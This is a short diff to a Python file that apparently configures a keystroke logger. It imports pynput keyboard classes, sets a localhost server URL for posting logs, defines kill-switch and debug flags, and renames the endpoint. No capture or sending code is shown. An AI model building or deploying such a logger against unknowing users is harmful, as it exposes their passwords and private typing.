@@ -8,7 +8,7 @@ from pynput.keyboard import Key, KeyCode
 
 server_ip = '127.0.0.1'
 server_port = 9998
-server_endpoint = 'logger'
+server_endpoint = 'log'
 server_url = f'http://{server_ip}:{server_port}/{server_endpoint}'
 kill_switch = True
 debug_logging = True
